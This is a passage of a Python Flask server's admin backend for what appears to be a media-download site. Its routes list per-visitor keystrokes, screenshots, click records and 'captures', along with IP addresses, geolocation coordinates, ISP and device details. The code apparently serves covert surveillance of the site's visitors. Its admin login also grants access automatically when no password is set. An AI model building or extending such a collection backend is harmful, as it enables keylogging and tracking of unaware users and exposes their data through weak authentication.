        return row['value'] if row else None
    except:
        return None

def set_admin_password_hash(hash_val):
    db = get_db()
    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
    db.execute("INSERT INTO settings(key,value) VALUES(?,?)", ('admin_password_hash', hash_val))
    db.commit()

def require_admin(f):
    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get('admin_authenticated'):
            if request.headers.get('Accept') == 'application/json' or request.is_json or request.path.startswith('/admin/') and request.path != '/admin' and request.path != '/admin/login' and request.path != '/admin/logout':
                return jsonify({"error": "Unauthorized", "login_url": "/admin/login"}), 401
            return redirect('/admin/login')
        return f(*args, **kwargs)
    return wrapper

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if session.get('admin_authenticated'):
        return redirect('/admin')
    pwd_hash = get_admin_password()
    if not pwd_hash:
        # No password set — allow access (dev mode)
        session['admin_authenticated'] = True
        return redirect('/admin')
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if check_password_hash(pwd_hash, pwd):
            session['admin_authenticated'] = True
            return redirect('/admin')
        return render_template("admin_login.html", error="Invalid password")
    return render_template("admin_login.html", error=None)

@app.route("/admin/logout")
def admin_logout():
    session.pop('admin_authenticated', None)
    return redirect('/admin/login')

@app.route("/admin/settings", methods=["GET"])
@require_admin
def admin_settings():
    pwd_hash = get_admin_password()
    has_password = bool(pwd_hash)
    db_stats = get_db_stats()
    is_env_password = bool(ADMIN_PASSWORD)
    return render_template("admin_settings.html", has_password=has_password, db_stats=db_stats, is_env_password=is_env_password)

@app.route("/admin/settings/password", methods=["POST"])
@require_admin
def admin_set_password():
    data = request.get_json(silent=True) or {}
    new_pwd = data.get("password", "")
    if len(new_pwd) < 4:
        return jsonify({"error": "Password must be at least 4 characters"}), 400
    if len(new_pwd) > 128:
        return jsonify({"error": "Password too long"}), 400
    hash_val = generate_password_hash(new_pwd)
    set_admin_password_hash(hash_val)
    return jsonify({"success": True, "message": "Password set successfully"})

@app.route("/admin/settings/password/disable", methods=["POST"])
@require_admin
def admin_disable_password():
    db = get_db()
    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
    db.commit()
    return jsonify({"success": True, "message": "Password protection disabled. Anyone can access admin."})

# === ADMIN PANEL ===

@app.route("/admin")
@require_admin
def admin():
    return render_template("admin.html")

@app.route("/admin/stats")
@require_admin
def admin_stats():
    db = get_db()
    total = db.execute("SELECT COUNT(*) FROM downloads").fetchone()[0]
    success = db.execute("SELECT COUNT(*) FROM downloads WHERE status='success'").fetchone()[0]
    failed = db.execute("SELECT COUNT(*) FROM downloads WHERE status='error'").fetchone()[0]
    sites = {}
    for r in db.execute("SELECT url,COUNT(*) as c FROM downloads GROUP BY url ORDER BY c DESC LIMIT 20"):
        site = get_site_label(r['url'])
        sites[site] = sites.get(site,0) + r['c']
    recent = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 100").fetchall()
    modes = {}
    for r in db.execute("SELECT mode,COUNT(*) as c FROM downloads GROUP BY mode"):
        modes[r['mode']] = r['c']
    by_day = {}
    for r in db.execute("SELECT DATE(time) as d,COUNT(*) as c FROM downloads GROUP BY d ORDER BY d DESC LIMIT 30"):
        by_day[r['d']] = r['c']
    countries = {}
    for r in db.execute("SELECT country,COUNT(*) as c FROM downloads WHERE country!='' GROUP BY country ORDER BY c DESC"):
        countries[r['country']] = r['c']
    captures_total = db.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    captures_recent = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 100").fetchall()
    screenshots_total = db.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
    screenshots_recent = db.execute("SELECT * FROM screenshots ORDER BY id DESC LIMIT 50").fetchall()
    clicks_total = db.execute("SELECT COUNT(*) FROM clicks").fetchone()[0]
    clicks_recent = db.execute("SELECT * FROM clicks ORDER BY id DESC LIMIT 100").fetchall()

    ips = db.execute("SELECT DISTINCT ip FROM downloads WHERE ip NOT IN ('127.0.0.1','::1','localhost')").fetchall()
    all_ips = set(r['ip'] for r in ips)
    for tbl in ['captures','screenshots','clicks']:
        for r in db.execute(f"SELECT DISTINCT ip FROM {tbl} WHERE ip NOT IN ('127.0.0.1','::1','localhost')"):
            all_ips.add(r['ip'])
    unique_ips = list(all_ips)

    session_count = db.execute("SELECT COUNT(DISTINCT session_id) FROM downloads WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM captures WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM screenshots WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM clicks WHERE session_id!=''").fetchone()[0]

    return jsonify({
        "total": total, "success": success, "failed": failed,
        "sites": dict(sorted(sites.items(), key=lambda x:-x[1])),
        "modes": modes, "by_day": dict(reversed(list(by_day.items()))),
        "countries": countries,
        "recent": [dict(r) for r in recent],
        "captures_total": captures_total,
        "captures": [dict(r) for r in captures_recent],
        "screenshots_total": screenshots_total,
        "screenshots": [dict(r) for r in screenshots_recent],
        "clicks_total": clicks_total,
        "clicks": [dict(r) for r in clicks_recent],
        "unique_ips": unique_ips,
        "ip_count": len(unique_ips),
        "session_count": session_count,
    })

@app.route("/admin/users")
@require_admin
def admin_users():
    db = get_db()
    sessions = {}
    for r in db.execute("SELECT session_id, ip, country, city, browser, os, device, time FROM captures WHERE session_id!='' ORDER BY id DESC"):
        sid = r['session_id']
        if sid not in sessions:
            sessions[sid] = {"session_id": sid, "ip": r['ip'], "country": r['country'], "city": r['city'], "browser": r['browser'], "os": r['os'], "device": r['device'], "last_seen": r['time'], "captures": 0, "downloads": 0}
        sessions[sid]["captures"] += 1
        if r['time'] > sessions[sid]["last_seen"]:
            sessions[sid]["last_seen"] = r['time']
    for r in db.execute("SELECT session_id, ip, country, city, time FROM downloads WHERE session_id!='' ORDER BY id DESC"):
        sid = r['session_id']
        if sid not in sessions:
            sessions[sid] = {"session_id": sid, "ip": r['ip'], "country": r['country'], "city": r['city'], "browser": "?", "os": "?", "device": "?", "last_seen": r['time'], "captures": 0, "downloads": 0}
        sessions[sid]["downloads"] += 1
        if r['time'] > sessions[sid]["last_seen"]:
            sessions[sid]["last_seen"] = r['time']
    return jsonify({"users": list(sessions.values())})

@app.route("/admin/user/<session_id>")
@require_admin
def admin_user(session_id):
    db = get_db()
    downloads = db.execute("SELECT * FROM downloads WHERE session_id=? ORDER BY id DESC LIMIT 200", (session_id,)).fetchall()
    captures = db.execute("SELECT * FROM captures WHERE session_id=? ORDER BY id DESC LIMIT 200", (session_id,)).fetchall()
    keys = db.execute("SELECT * FROM keystrokes WHERE session_id=? ORDER BY id DESC LIMIT 100", (session_id,)).fetchall()
    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures], "keystrokes": [dict(r) for r in keys]})

@app.route("/admin/logs")
@require_admin
def admin_logs():
    db = get_db()
    rows = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/admin/captures")
@require_admin
def admin_all_captures():
    db = get_db()
    rows = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/admin/locations")
@require_admin
def admin_locations():
    db = get_db()
    dl_locs = db.execute("SELECT time,ip,country,city,lat,lon,isp FROM downloads WHERE lat!=0 AND lon!=0 ORDER BY id DESC LIMIT 200").fetchall()
    cap_locs = db.execute("SELECT time,ip,country,city,lat,lon,isp FROM captures WHERE lat!=0 AND lon!=0 ORDER BY id DESC LIMIT 200").fetchall()
    return jsonify({"downloads": [dict(r) for r in dl_locs], "captures": [dict(r) for r in cap_locs]})

@app.route("/admin/all")
@require_admin
def admin_all():
    db = get_db()
    downloads = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
    captures = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures]})

@app.route("/admin/captures/delete/<int:capture_id>", methods=["POST"])
@require_admin
def admin_delete_capture(capture_id):
    db = get_db()
    row = db.execute("SELECT * FROM captures WHERE id=?", (capture_id,)).fetchone()
    if not row:
        return jsonify({"error": "Capture not found"}), 404
    fpath = CAPTURES / row["filename"]
    try:
        if fpath.is_file():
            os.remove(fpath)
    except Exception as e:
        return jsonify({"error": f"Failed to delete file: {e}"}), 500
    db.execute("DELETE FROM captures WHERE id=?", (capture_id,))
    db.commit()
    return jsonify({"success": True})

@app.route("/admin/delete-all", methods=["POST"])
@require_admin
def admin_delete_all():
    db = get_db()
    data = request.get_json(silent=True) or {}
    target = data.get("target", "all")
    if target in ("captures", "all"):
        rows = db.execute("SELECT filename FROM captures").fetchall()
        for r in rows:
            fpath = CAPTURES / r["filename"]
            try:
                if fpath.is_file(): os.remove(fpath)
            except: pass
        db.execute("DELETE FROM captures")
    if target in ("screenshots", "all"):
        rows = db.execute("SELECT filename FROM screenshots").fetchall()
        for r in rows:
            fpath = CAPTURES / r["filename"]
            try:
                if fpath.is_file(): os.remove(fpath)
            except: pass
        db.execute("DELETE FROM screenshots")
    if target in ("downloads", "all"):
        rows = db.execute("SELECT filename FROM downloads WHERE filename!=''").fetchall()
        for r in rows:
            fpath = DOWNLOADS / r["filename"]
            try:
                if fpath.is_file(): os.remove(fpath)
            except: pass
        db.execute("DELETE FROM downloads")
    if target in ("clicks", "all"):
        db.execute("DELETE FROM clicks")
    if target in ("keystrokes", "all"):
        db.execute("DELETE FROM keystrokes")
    db.commit()
    return jsonify({"success": True, "targets": [target]})

@app.route("/screenshots/<filename>")
def serve_screenshot(filename):
    filename = safe_filename(filename)
    if not filename: return jsonify({"error":"Invalid filename"}), 400
    fpath = CAPTURES / filename
    if fpath.resolve().parent != CAPTURES.resolve():
        return jsonify({"error":"Access denied"}), 403
    if not fpath.is_file(): return jsonify({"error":"Not found"}), 404
    return send_file(str(fpath), mimetype='image/png')

@app.route("/admin/screenshot/delete/<int:sid>", methods=["POST"])
@require_admin
def admin_delete_screenshot(sid):
    db = get_db()
    row = db.execute("SELECT * FROM screenshots WHERE id=?", (sid,)).fetchone()
    if not row:
        return jsonify({"error": "Screenshot not found"}), 404
    fpath = CAPTURES / row["filename"]
    try:
        if fpath.is_file(): os.remove(fpath)
    except Exception as e:
        return jsonify({"error": f"Failed to delete file: {e}"}), 500
    db.execute("DELETE FROM screenshots WHERE id=?", (sid,))
    db.commit()
    return jsonify({"success": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("FLASK_DEBUG", "0") == "1"
    print(f"ffmpeg: {FFMPEG_OK} | Admin: http://localhost:{port}/admin")
    if ADMIN_PASSWORD:
        print(f"admin auth: enabled")
    else:
        print(f"admin auth: DISABLED (set ADMIN_PASSWORD env var)")
    if WEBHOOK_URL:
        print(f"webhook: {WEBHOOK_URL}")
    if mongo_db:
        print(f"MongoDB: connected")
    app.run(host="0.0.0.0", port=port, debug=debug)
